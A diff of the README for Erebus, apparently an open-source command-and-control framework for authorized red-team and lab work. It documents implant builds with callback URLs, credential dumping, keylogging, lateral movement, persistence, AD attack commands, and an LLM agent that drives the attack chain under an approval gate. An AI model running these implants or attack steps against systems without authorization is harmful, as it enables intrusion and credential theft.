@@ -1,500 +1,286 @@
-# Erebus Exploitation Framework
+# Erebus
 
-A custom command-and-control (C2) framework for AI-driven offensive security operations. The **teamserver**, operator CLI, and listeners are Go; implants are available as **Go** (default) or an optional **C** Windows build (`cimplant/`). Erebus uses beacon-mode architecture with protobuf wire protocols, gRPC operator API, and mTLS-secured communications.
+Lab-grade C2 for **authorized** offensive work: red team, owned labs, and HTB.
 
-> **For authorized security testing, red team engagements, and research purposes only.**  
-> Unauthorized access to computer systems is illegal. See [SECURITY.md](SECURITY.md) and [LICENSE](LICENSE).
+Teamserver and operator API are Go. Implants speak the same protobuf over HTTPS or DNS. **C is the engagement implant** (Windows PE and Linux). Go remains the fallback when you need the full module set.
 
-## Project status
+> Authorized testing and research only. You need explicit permission (or you own the systems). See [SECURITY.md](SECURITY.md) and [LICENSE](LICENSE).
 
-| | |
-|---|---|
-| **Release** | **v0.1.0** — lab / research early public |
-| **Maturity** | Core C2 loop is usable; not a finished commercial product |
-| **Primary implant** | **Go** (Linux + Windows) — recommended |
-| **C implant** | Experimental Windows PE; several AD/lateral paths are stubs |
-| **Validation** | Unit/e2e smoke tests; authorized HTB/lab engagements |
+---
 
-### What works well (v0.1)
+<table>
+<tr>
+<td width="33%" valign="top">
 
-- Teamserver + HTTPS listener, session management, task queue, SQLite loot
-- Go implant: shell, files (path-jailed), process, network recon, AD modules (LDAP / Kerberoast / AS-REP), cloud harvest, Windows post-ex modules
-- Operator CLI + mTLS seats; dual-control **approval gate** for high-risk tasks
-- AI console: multi-provider LLM (`ai setup`), Plan/Auto TUI, Ollama local/remote/cloud
-- DNS listener with bounded unauthenticated reassembly (lab use)
+**Status**
 
-### Experimental / incomplete
+v0.1.x · lab / research
 
-- **C implant:** Kerberoast/AS-REP ticket extraction and PsExec/WinRM/DCOM lateral are stubs; TLS pinning incomplete
-- Console Metasploit-style `use` / `run` module tree is **not** fully wired — use `ai` (Auto) or `erebus operator`
-- Some Windows post-ex edges (e.g. browser DPAPI depth, inject error paths)
-- No malleable C2 profiles, sleep masking, or multi-teamserver federation yet
+Core loop works. Not a commercial product.
 
-### Not production claims
+</td>
+<td width="33%" valign="top">
 
-Do **not** treat v0.1 as enterprise-ready C2, EDR-evasive by default, or support-backed commercial software. Use in **labs and authorized engagements** only. Report vulns per [SECURITY.md](SECURITY.md).
+**Prefer**
 
-## Architecture
+`erebus teamserver` to keep C2 up
 
+`generate --language c` on both OS
+
+Host `ldap` / `smb` / `ad` before an implant
+
+</td>
+<td width="33%" valign="top">
+
+**Do not claim**
+
+EDR-evasive by default
+
+Full ADCS / RBCD / tickets
+
+Enterprise support
+
+</td>
+</tr>
+</table>
+
+---
+
+## Pieces
+
+<table>
+<tr>
+<td width="50%" valign="top">
+
+**Teamserver**
+
+Go. gRPC on `127.0.0.1:50051` (mTLS). HTTPS and DNS listeners. SQLite at `~/.erebus/erebus.db`. High-risk `ExecuteTask` waits on the [approval gate](server/approval/).
+
+</td>
+<td width="50%" valign="top">
+
+**Operator**
+
+Unified CLI: `erebus`. Interactive console, REPL, and one-shot `erebus op`. Dual seats (`operator` + `approver` certs) for approve/deny.
+
+</td>
+</tr>
+<tr>
+<td width="50%" valign="top">
+
+**Implant**
+
+Beacon, HMAC-SHA256 identity, AES-256-GCM sessions. **C** (`cimplant/`) is primary. **Go** (`implant/`) is the complete module set and SOCKS fallback.
+
+</td>
+<td width="50%" valign="top">
+
+**Host tools** (no session)
+
+`erebus ldap` · `smb` · `ad` · `kerberos` · `mqtt` · `relay`
+
+Same idea as a pre-implant kit. See [OPERATOR_PRE_IMPLANT.md](docs/OPERATOR_PRE_IMPLANT.md).
+
+</td>
+</tr>
+</table>
+
+```mermaid
+flowchart LR
+  subgraph ops [Operator]
+    CLI[erebus CLI / AI]
+  end
+  subgraph ts [Teamserver]
+    API[gRPC mTLS]
+    L[HTTPS / DNS]
+    A[Approval]
+    Q[Task queue]
+    DB[(SQLite)]
+  end
+  subgraph field [Field]
+    I[Implant C or Go]
+    H[Host ldap smb ad]
+  end
+  CLI <--> API
+  API --> A --> Q
+  I <--> L
+  H -.->|no C2| field
 ```
-┌──────────────┐         gRPC (mTLS)         ┌──────────────────────┐
-│   Operator   │◄───────────────────────────►│      Teamserver      │
-│   CLI / AI   │                             │                      │
-└──────────────┘                             │  ┌────────────────┐  │
-                                             │  │ Listener Mgr   │  │
-┌──────────────┐   HTTPS/DNS (Protobuf)      │  │  HTTPS / DNS   │  │
-│   Implant    │◄───────────────────────────►│  ├────────────────┤  │
-│  Go or C     │     /register, /beacon      │  │ Sessions Mgr   │  │
-│  (Beacon)    │                             │  ├────────────────┤  │
-└──────────────┘                             │  │ Approval Gate  │  │
-                                             │  │  (gRPC only)   │  │
-                                             │  ├────────────────┤  │
-                                             │  │Task Dispatcher │  │
-                                             │  ├────────────────┤  │
-                                             │  │   SQLite DB    │  │
-                                             │  └────────────────┘  │
-                                             └──────────────────────┘
-```
 
-Implant traffic enters via **Listener Manager** → shared beacon handler → **Sessions Manager**. Operator `ExecuteTask` calls pass through **Approval Gate** before **Task Dispatcher** enqueues work for the next beacon.
+Implant traffic: listener → session → next beacon. Operator tasks: gRPC → approval (if high-risk) → queue.
 
-## Features
+---
 
-### Core Infrastructure
-- **Teamserver** — Central C2 server with gRPC API for operator/AI interaction
-- **HTTPS Listener** — TLS-encrypted callback handler for implant beacons
-- **DNS Listener** — Covert C2 channel via TXT record queries with base32-encoded data
-- **Beacon Implant** — Lightweight agent with configurable sleep/jitter intervals
-- **Operator CLI** — Interactive REPL with tab completion for direct operator control
-- **Task Queue** — Async task dispatch with optional blocking wait and 10-minute default timeout
-- **Event Streaming** — Real-time gRPC event stream (new sessions, task results, approvals)
-- **Approval Gates** — Server-side gates on `ExecuteTask` for creds dump, lateral movement, persistence, injection, and high-risk `TASK_MODULE` targets (operator `approve`/`deny` via CLI or gRPC)
+## What works
 
-### Implant Capabilities
+<table>
+<tr>
+<td width="50%" valign="top">
 
-| Category | Tasks |
-|---|---|
-| **Execution** | Shell command execution with structured output |
-| **File Operations** | Upload/download with 50MB cap, TOCTOU-safe reads |
-| **Process Management** | Process listing (cross-platform), process kill |
-| **Network Recon** | Interface enumeration, TCP port scanning with service detection |
-| **Screenshot** | GDI-based screen capture (Windows) |
-| **Keylogger** | Low-level keyboard hook with window title capture (Windows) |
-| **SOCKS Proxy** | SOCKS5 tunnel for network pivoting |
+**C2 loop**
 
-### Active Directory Attacks
-- **LDAP Enumeration** — 12 pre-defined query types (kerberoastable SPNs, AS-REP roastable, domain admins, DCs, GPOs, trusts, delegation, custom filters)
-- **Kerberoasting** — TGS extraction with hashcat-compatible output (modes 13100/19600/19700)
-- **AS-REP Roasting** — Pre-auth bypass with hashcat mode 18200 output
-- **Credential Dumping** — LSASS minidump, SAM/SYSTEM hive extraction, browser credential harvesting (Chrome/Edge/Firefox)
+Register / beacon / task / result. HTTPS (silent 404 on auth fail). DNS TXT + base32 chunks. Sleep/jitter from build flags.
 
-### Lateral Movement
-- **WinRM** — HTTP-based remote execution (cross-platform)
-- **PsExec** — SMB-based payload staging via ADMIN$ share
-- **WMI** — Windows Management Instrumentation execution (Windows)
-- **DCOM** — COM/DCOM automation for remote execution (Windows)
+</td>
+<td width="50%" valign="top">
 
-### Evasion & Post-Exploitation
-- **Process Injection** — CreateRemoteThread, APC Queue methods with pluggable framework
-- **PE/Shellcode Loader** — Reflective PE loading with full IAT patching and relocation processing
-- **Persistence** — Scheduled tasks, registry Run keys, Windows services
-- **Privilege Escalation** — Token theft (DuplicateTokenEx), UAC bypass (fodhelper/eventvwr)
+**On the implant**
 
-### Security
-- **mTLS** — Mutual TLS for operator ↔ teamserver communication
-- **HMAC-SHA256** — Implant identity verification via pre-shared secret
-- **AES-256-GCM** — Session encryption for implant payloads
-- **Cross-platform** — Linux and Windows implant builds
-- **SQLite Persistence** — Sessions, tasks, and loot stored locally
+Shell, files (path-jailed), process, ifconfig, portscan. Go AD: LDAP enum, Kerberoast, AS-REP. WinRM PTH (Go). Cloud harvest. Windows post-ex on Go.
 
-## Quick Start
+</td>
+</tr>
+<tr>
+<td width="50%" valign="top">
 
-### Prerequisites
+**On the operator host**
 
-- Go 1.22+
-- `protoc` with `protoc-gen-go` and `protoc-gen-go-grpc` plugins
-- `make`
-- **C implant (optional):** Windows cross-compiler — Fedora: `mingw64-gcc` + `mingw64-cpp`; or run `scripts/setup_c_toolchain.sh` for llvm-mingw
+LDAP (LDAPS first, dangling CA templates). SMB list/get. Password reset (LDAPS, then Samba SAMR). Clock skew + `with-skew`. MQTT and HTTP NTLM relay.
 
-### Build
+</td>
+<td width="50%" valign="top">
+
+**Labs exercised**
+
+Support, Logging, Ghostlink, DanglingTree. Notes under `reports/htb-*/`. Skills: `erebus-htb`, `htb-pentest`.
+
+</td>
+</tr>
+</table>
+
+### Honest gaps
+
+| Area | Today |
+| --- | --- |
+| C implant | Windows PE + Linux peer. Kerberoast/AS-REP extract and several laterals are stubs. TLS pin not finished. |
+| ADCS | Enum dangling names only. Create / ESC1 / PKINIT stay Certipy (`docs/plans/SPRINT_E_ADCS.md`). |
+| Tickets / RBCD / shadow | Planned Sprint B. Not shipped. |
+| `erebus serve` | Starts teamserver **and** the REPL. Closing stdin **stops C2**. Use `erebus teamserver`. |
+| Default HTTPS port | Fresh config listens on **443**. Lab boxes often use **8443** in `~/.erebus/server.yaml`. |
+| PsExec | Stages over SMB; service create is incomplete. |
+| OPSEC | No malleable profiles, no sleep mask, no multi-server. |
+
+---
+
+## Quick start
+
+Needs Go 1.22+ (repo is on 1.25), `make`, and `protoc` for proto regen. C PE: mingw or `scripts/setup_c_toolchain.sh`.
 
 ```bash
-# Generate protobuf code
-make proto
+make erebus
+# keep C2 up (this is the lab default)
+./build/erebus teamserver
 
-# Build all components
-make all
-
-# Or build individually:
-make erebus         # Build unified start command
-make teamserver     # Build teamserver
-make implant        # Build implant (Linux)
-make implant-win    # Build implant (Windows)
-make operator       # Build operator CLI
-make implant-c      # Build C implant (Windows PE, requires mingw)
+# other terminal
+./build/erebus certs seats
+./build/erebus operator
 ```
 
-### Verify Build
+```bash
+make install          # ~/.local/bin/erebus
+erebus                # console
+erebus help
+```
+
+### Implant
 
 ```bash
-# Unit tests + teamserver/implant builds (+ C implant if mingw available)
+# Operator (registers the PSK)
+erebus op generate --os windows --language c \
+  --callback https://<tun0>:8443 --out implant.exe
+
+# Makefile (then: erebus op register-secret <id> <hex>)
+make implant-c CALLBACK_URL=https://<tun0>:8443 \
+  CA_CERT_PATH=$HOME/.erebus/ca-cert.pem SLEEP_MS=500 JITTER_PCT=10
+
+make implant-c-linux CALLBACK_URL=https://<tun0>:8443 \
+  CA_CERT_PATH=$HOME/.erebus/ca-cert.pem SLEEP_MS=500 JITTER_PCT=10
+```
+
+Interactive lab: low sleep is fine. Kill the implant when you leave.
+
+### Host-side (no beacon)
+
+```bash
+erebus smb shares --host <DC> --anon
+erebus ldap enum --dc <DC> --domain DOM --user u --pass-file ./p --type interesting
+erebus ldap dangling --dc <DC> --domain DOM --user u --pass-file ./p
+erebus ad password --dc <DC> --domain DOM --user u --pass-file ./p \
+  --target t --new-pass-file ./n --yes
+erebus kerberos skew --dc <DC>
+erebus kerberos with-skew --dc <DC> -- certipy auth -pfx admin.pfx -dc-ip <DC>
+```
+
+Secrets with `$` go in files (`--pass-file`). Do not put them in bash double quotes.
+
+---
+
+## Operator surface
+
+<table>
+<tr>
+<td width="50%" valign="top">
+
+**Session**
+
+`sessions` `use` `shell` `upload` `download` `ps` `kill` `ifconfig` `portscan` `sleep` `loot` `events` `listeners`
+
+</td>
+<td width="50%" valign="top">
+
+**AD / lateral**
+
+`ldap-enum` `kerberoast` `asreproast` `creds-dump` `lateral winrm\|wmi\|psexec` `smb` (implant)  
+`ldap` `host-smb` `ad` `kerberos` (host)
+
+</td>
+</tr>
+<tr>
+<td width="50%" valign="top">
+
+**Build / approve**
+
+`generate` `register-secret` `pending` `approve` `deny`  
+`erebus op generate` · `erebus op shell` (auto-approve with both seats)
+
+</td>
+<td width="50%" valign="top">
+
+**High-risk**
+
+creds dump, lateral, persist, inject, PE load, privesc — block until a **different** mTLS CN approves.
+
+</td>
+</tr>
+</table>
+
+Wire: implant `c2.proto` (HMAC + AES-GCM). Operator `api.proto` (mTLS). Config: `~/.erebus/server.yaml`.
+
+---
+
+## Build and test
+
+```bash
+make proto erebus          # CLI
+make implant-c             # Windows C
+make implant-c-linux       # Linux C
+make implant implant-win   # Go
 bash scripts/smoke_test.sh
-
-# Live teamserver flow: register → beacon → shell task → approval gate
 go test ./server/e2e/... -v -count=1
 ```
 
-### Start Erebus (recommended)
-
-```bash
-make install    # puts erebus + Erebus in ~/.local/bin
-erebus          # or: Erebus
-```
-
-One-time build without install: `make erebus && ./build/erebus`
-
-With no arguments, `erebus` opens the interactive console (ASCII banner, `erebus ›` prompt).
-
-```bash
-./build/erebus serve      # start teamserver + operator C2 session
-./build/erebus teamserver # teamserver only
-./build/erebus operator   # connect to existing teamserver
-./build/erebus -json      # JSON console mode
-./build/erebus help
-```
-
-### Run Teamserver
-
-```bash
-./build/teamserver
-```
-
-The teamserver starts with defaults:
-- gRPC API on `127.0.0.1:50051`
-- HTTPS listener on `0.0.0.0:443`
-- Data stored in `~/.erebus/`
-
-Override via CLI flags:
-
-```bash
-./build/teamserver \
-  -grpc 127.0.0.1:50051 \
-  -host 0.0.0.0 \
-  -port 8443 \
-  -secret <hex-encoded-secret>
-```
-
-### Run Operator CLI
-
-```bash
-./build/operator \
-  -server 127.0.0.1:50051 \
-  -cert operator.crt \
-  -key operator.key \
-  -ca ca.crt
-```
-
-### Build Implant with Custom Config
-
-**Preferred (operator REPL, after `erebus serve`):**
-
-```bash
-erebus operator   # or: erebus serve then use operator session
-generate --os linux --arch amd64 --sleep 500 --callback https://your-c2:8443 --out ./implant
-generate --os windows --arch amd64 --language c --sleep 500 --callback https://your-c2:8443
-generate --help
-```
-
-**Makefile (dev):**
-
-```bash
-# HTTPS transport (default) — use low SLEEP_MS for interactive/demo
-make implant \
-  CALLBACK_URL=https://your-c2-server:8443 \
-  SLEEP_MS=500 \
-  JITTER_PCT=10
-
-# DNS transport
-make implant \
-  TRANSPORT_TYPE=dns \
-  DNS_DOMAIN=c2.example.com \
-  DNS_SERVER=ns1.example.com:53 \
-  SLEEP_MS=30000
-```
-
-### Implant OPSEC tiers
-
-| Tier | Language | Typical size | Use |
-|------|----------|--------------|-----|
-| Dev / demo | Go | Large (~15–25MB stripped) | Fast iterate, Linux/Windows, full modules |
-| Windows engagement | C (`--language c`) | Much smaller PE | Prefer when mingw toolchain available |
-
-Teamserver **does not** force a 5s beacon interval; implants keep build-time `sleep_ms` unless the operator runs `sleep <ms>`. Task results flush immediately after execute (no extra full sleep before delivery).
-
-### C Implant (Windows)
-
-The C implant mirrors the Go wire protocol (HTTPS/DNS, HMAC auth, AES-256-GCM session encryption) with indirect syscalls and compiled-in modules.
-
-```bash
-# One-time toolchain (llvm-mingw, ~150MB download)
-bash scripts/setup_c_toolchain.sh
-
-# Or on Fedora:
-# sudo dnf install mingw64-gcc mingw64-cpp
-
-make implant-c \
-  IMPLANT_ID=my-implant \
-  IMPLANT_SECRET=$(openssl rand -hex 32) \
-  CALLBACK_URL=https://your-c2:8443
-# Output: build/implant_c.exe
-```
-
-Also: operator `generate --language c` (windows/amd64 exe only).
-
-**C implant gaps (honest):** Kerberoast/AS-REP ticket extraction and several lateral primitives (PsExec, WinRM, DCOM) are stubs; WMI works. TLS pinning in `cimplant/src/transport/https.c` is not fully implemented. Full validation requires a Windows host or VM.
-
-## Configuration
-
-Config file is auto-created at `~/.erebus/server.yaml`:
-
-```yaml
-grpc_addr: "127.0.0.1:50051"
-db_path: "/home/user/.erebus/erebus.db"
-data_dir: "/home/user/.erebus"
-implant_secret: "<auto-generated hex>"
-listeners:
-  - name: default-https
-    protocol: https
-    host: 0.0.0.0
-    port: 443
-```
-
-## Operator CLI Commands
-
-```
-sessions              - List active sessions
-use <session-id>      - Select active session
-shell <command>       - Execute shell command
-upload <local> <remote> - Upload file
-download <remote>     - Download file
-ps                    - List processes
-kill <pid>            - Kill process
-ifconfig              - List network interfaces
-portscan <host> <ports> - TCP port scan
-sleep <ms> [jitter]   - Set beacon interval
-screenshot            - Take screenshot
-keylog <start|stop|dump> - Keylogger control
-tasks                 - List session tasks
-result <task-id>      - Get task result
-loot                  - List loot
-events                - Stream events
-listeners             - List listeners
-pending               - List pending approvals
-approve <id>          - Approve operation
-deny <id> [reason]    - Deny operation
-exit                  - Exit operator CLI
-help                  - Show help
-```
-
-High-risk tasks (`TASK_CREDS_DUMP`, `TASK_LATERAL_MOVE`, `TASK_PERSIST`, `TASK_INJECT`, `TASK_PE_LOAD`, `TASK_PRIVESC`, and `TASK_MODULE` for `creds_dump`, `lateral_move`, `persist`, `privesc`, `inject`) block in `ExecuteTask` until an operator approves via `pending`/`approve` or the gRPC `Approve` RPC.
-
-**Dual-control:** The requester and approver must use different mTLS client certificates (different CN). On first `erebus serve`, the teamserver generates `~/.erebus/certs/operator.pem` (CN `operator`) for task execution and `~/.erebus/certs/approver.pem` (CN `approver`) for `pending`/`approve`/`deny`. The operator REPL uses both automatically. For two-terminal workflows, run task commands with the operator cert and approvals with the approver cert:
-
-```bash
-# Terminal 1 — request high-risk task (operator seat)
-erebus operator -cert ~/.erebus/certs/operator.pem -key ~/.erebus/certs/operator-key.pem -ca ~/.erebus/certs/ca.pem
-erebus> use <session-id>
-erebus> shell ...
-
-# Terminal 2 — approve (approver seat)
-erebus operator -cert ~/.erebus/certs/approver.pem -key ~/.erebus/certs/approver-key.pem -ca ~/.erebus/certs/ca.pem
-erebus> pending
-erebus> approve <approval-id>
-```
-
-**File operations:** Implant `upload`/`download` paths are relative to the implant working directory. Absolute paths and `..` traversal are rejected server-side in the implant path jail.
-
-## AI (Ollama + console)
-
-The console `ai` command talks to a local **Ollama** instance by default (`http://localhost:11434/v1`, model `llama3.2`). If the teamserver is running and operator certs exist, `ai` upgrades to the full autonomous agent.
-
-```bash
-ollama serve
-ollama pull llama3.2
-
-cp config/llm.yaml.example ~/.erebus/llm.yaml   # optional overrides
-./build/erebus
-erebus › ai "enumerate kerberoastable users in corp.local"
-```
-
-Set `OPENAI_API_KEY` to use OpenAI instead of Ollama (see `config/llm.yaml.example`).
-
-## AI Agent
-
-The AI agent sidecar connects to the teamserver over gRPC (mTLS) and drives the attack chain via an OpenAI-compatible LLM (Ollama by default).
-
-```bash
-make agent
-cp config/agent.yaml.example ~/.erebus/agent.yaml
-# Defaults to Ollama; set OPENAI_API_KEY for OpenAI
-
-# Semi-autonomous engagement
-./build/agent -config ~/.erebus/agent.yaml \
-  -session <session-id> \
-  -objective "enumerate AD and find kerberoastable accounts"
-
-# Wait for new implant, then run initial enumeration
-./build/agent -config ~/.erebus/agent.yaml -watch \
-  -objective "initial recon on new session"
-
-# JSON output (one object per step)
-./build/agent -json -config ~/.erebus/agent.yaml -session <id> -objective "..."
-
-# Smoke test without LLM
-./build/agent -config ~/.erebus/agent.yaml -session <id> -dry-run net_ifconfig
-```
-
-**Agent tools:** `list_sessions`, `get_session`, `list_loot`, `run_shell`, `net_ifconfig`, `process_list`, `process_kill`, `portscan`, `file_download`, `file_upload`, `cloud_harvest`, `screenshot`, `socks_start`, `socks_stop`, `ldap_enum`, `kerberoast`, `asreproast`, `creds_dump`, `lateral_move`, `persist`, `privesc`, `mission_complete`.
-
-Chainable module results (LDAP, kerberoast, creds dump, portscan, cloud) include `next_suggested_actions` in protobuf — the interpreter surfaces these to the LLM as follow-on steps.
-
-**Semi-autonomous behavior:** Low-risk tools (`run_shell`, `net_ifconfig`, `process_list`, `portscan`, `cloud_harvest`, `file_download`, etc.) run automatically. High-risk tools (`ldap_enum`, `kerberoast`, `creds_dump`, `lateral_move`, etc.) block until a **different operator** approves in a second terminal using the approver cert (see dual-control above).
-
-## Testing
-
-| Script / test | What it covers |
-|---|---|
-| `scripts/smoke_test.sh` | Unit tests (suggestions, agent, DNS chunks, approval, beacon handler), teamserver + agent + implant builds, optional C PE build |
-| `go test ./server/e2e/...` | Live teamserver: implant register/beacon, shell task, creds-dump approval gate, agent executor (shell, LDAP suggestions, file download, approval flow) |
-| `docs/GOLDEN_DEMO.md` | Sprint 1 GOAD Golden Demo runbook (Plan → Auto → approve) |
-| `scripts/golden_ad_eval.md` | 5× Auto pass/fail checklist |
-| `docs/AD_ENGAGEMENT.md` | AD post-ex cookbook (Sprint 1–2 path) |
-| `docs/GOAD_LAB.md` | GOAD/MINILAB install status and sudo steps for this host |
-
-## Project Structure
-
-```
-.
-├── cimplant/                # C Windows implant (beacon, transport, modules)
-├── cmd/
-│   ├── teamserver/          # Teamserver entry point
-│   ├── implant/             # Go implant entry point
-│   ├── operator/            # Operator CLI (REPL + commands)
-│   └── agent/               # AI agent sidecar (LLM + gRPC)
-├── scripts/
-│   ├── smoke_test.sh        # Build + unit test smoke checks
-│   ├── setup_c_toolchain.sh # llvm-mingw downloader
-│   └── e2e_live.sh          # Wrapper for live e2e tests
-├── server/
-│   ├── server.go            # Teamserver core
-│   ├── grpc.go              # gRPC service implementation
-│   ├── events.go            # Event bus for real-time streaming
-│   ├── config.go            # Server configuration
-│   ├── approval/            # Approval gate for high-risk ops
-│   ├── db/                  # SQLite store, models, migrations
-│   ├── builder/             # Go + C implant build pipeline
-│   ├── listeners/           # HTTPS + DNS listeners (shared beacon handler)
-│   ├── e2e/                 # Live teamserver integration tests
-│   ├── sessions/            # Session tracking + reaper
-│   ├── socks/               # Server-side SOCKS5 proxy
-│   └── tasks/               # Task queue + dispatcher
-├── pkg/agent/               # AI agent library (catalog, loop, LLM tools)
-├── implant/
-│   ├── implant.go           # Implant core (beacon loop)
-│   ├── config.go            # Build-time config (ldflags)
-│   ├── transport/           # HTTPS + DNS transport layers
-│   ├── tasks/               # Task executor + handlers
-│   │   ├── executor.go      # Task routing (switch on TaskType)
-│   │   ├── file.go          # File upload/download
-│   │   ├── process*.go      # Process list/kill (cross-platform)
-│   │   ├── network.go       # Ifconfig + port scan
-│   │   ├── screenshot*.go   # Screen capture (Windows/stub)
-│   │   ├── keylog*.go       # Keylogger (Windows/stub)
-│   │   ├── inject*.go       # Process injection (Windows/stub)
-│   │   ├── peload*.go       # PE loader (Windows/stub)
-│   │   └── socks.go         # SOCKS5 proxy endpoint
-│   └── modules/
-│       ├── shell/           # Shell execution module
-│       ├── ad/              # LDAP enum, Kerberoast, AS-REP roast
-│       ├── creds/           # LSASS, SAM, browser credential dumping
-│       ├── lateral/         # WinRM, PsExec, WMI, DCOM
-│       ├── persist/         # Scheduled tasks, registry, services
-│       └── privesc/         # Token theft, UAC bypass
-├── pkg/
-│   ├── crypto/              # AES, mTLS, key generation
-│   ├── dnstransport/        # DNS chunk encode/decode (shared server + implant)
-│   ├── pb/                  # Generated protobuf code
-│   └── plugin/              # Module plugin interface + registry
-├── proto/                   # Protobuf definitions
-│   ├── c2.proto             # Implant <-> Teamserver messages
-│   ├── api.proto            # Operator gRPC API + service
-│   └── listener.proto       # Listener configuration messages
-└── Makefile
-```
-
-## Wire Protocol
-
-All communications use Protocol Buffers:
-
-| Channel | Protocol | Auth | Definition |
-|---|---|---|---|
-| Implant ↔ Teamserver | HTTPS + Protobuf | HMAC-SHA256 + AES-256-GCM | `c2.proto` |
-| Implant ↔ Teamserver | DNS TXT + Protobuf | HMAC-SHA256 + AES-256-GCM | `c2.proto` |
-| Operator ↔ Teamserver | gRPC | mTLS | `api.proto` |
-
-## gRPC API
-
-The `ErebusC2` service exposes:
-
-| RPC | Description |
-|---|---|
-| `StartListener` | Start a new listener (HTTPS or DNS) |
-| `StopListener` | Stop a running listener |
-| `ListListeners` | List all listeners |
-| `ListSessions` | List active sessions |
-| `GetSession` | Get session details |
-| `KillSession` | Terminate a session |
-| `ExecuteTask` | Dispatch a task to an implant |
-| `GetTaskResult` | Poll for task result |
-| `ListTasks` | List tasks for a session |
-| `Subscribe` | Stream real-time events |
-| `GenerateImplant` | Generate implant binary |
-| `ListLoot` | List collected loot |
-| `GetLoot` | Retrieve loot item |
-| `ListPendingApprovals` | List pending approval requests |
-| `Approve` | Approve a high-risk operation |
-| `Deny` | Deny a high-risk operation |
-
-## Task Types
-
-| Task Type | Description | Platform |
-|---|---|---|
-| `TASK_SHELL` | Shell command execution | Cross-platform |
-| `TASK_FILE_DOWNLOAD` | Download file from target | Cross-platform |
-| `TASK_FILE_UPLOAD` | Upload file to target | Cross-platform |
-| `TASK_PROCESS_LIST` | List running processes | Cross-platform |
-| `TASK_PROCESS_KILL` | Kill a process by PID | Cross-platform |
-| `TASK_NET_IFCONFIG` | List network interfaces | Cross-platform |
-| `TASK_NET_PORTSCAN` | TCP port scan | Cross-platform |
-| `TASK_SCREENSHOT` | Capture screenshot | Windows |
-| `TASK_KEYLOG_START` | Start keylogger | Windows |
-| `TASK_KEYLOG_STOP` | Stop keylogger | Windows |
-| `TASK_KEYLOG_DUMP` | Dump captured keystrokes | Windows |
-| `TASK_INJECT` | Process injection | Windows |
-| `TASK_PE_LOAD` | Reflective PE loading | Windows |
-| `TASK_SOCKS_START` | Start SOCKS5 proxy | Cross-platform |
-| `TASK_SOCKS_STOP` | Stop SOCKS5 proxy | Cross-platform |
-| `TASK_SLEEP` | Change beacon interval | Cross-platform |
-| `TASK_EXIT` | Terminate implant | Cross-platform |
-| `TASK_MODULE` | Execute a registered module | Cross-platform |
-| `TASK_LDAP_ENUM` | LDAP/AD enumeration | Cross-platform |
-| `TASK_KERBEROAST` | Kerberoasting attack | Cross-platform |
-| `TASK_ASREP_ROAST` | AS-REP roasting attack | Cross-platform |
-| `TASK_CREDS_DUMP` | Credential dumping | Windows |
-| `TASK_LATERAL_MOVE` | Lateral movement | Varies |
-| `TASK_PERSIST` | Install persistence | Windows |
-| `TASK_PRIVESC` | Privilege escalation | Windows |
-
-## License
+---
+
+## Docs
+
+| | |
+| --- | --- |
+| HTB queue | [docs/HTB_NEXT_RUNBOOK.md](docs/HTB_NEXT_RUNBOOK.md) |
+| AD cookbook | [docs/AD_ENGAGEMENT.md](docs/AD_ENGAGEMENT.md) |
+| Host tools / inbound | [docs/OPERATOR_PRE_IMPLANT.md](docs/OPERATOR_PRE_IMPLANT.md) · [docs/OPERATOR_INBOUND.md](docs/OPERATOR_INBOUND.md) |
+| Implant plan | [docs/IMPLANT_ROADMAP.md](docs/IMPLANT_ROADMAP.md) |
+| Skills | `.grok/skills/erebus-htb` · `.claude/skills/erebus-htb` |
+
+---
 
 [MIT](LICENSE)
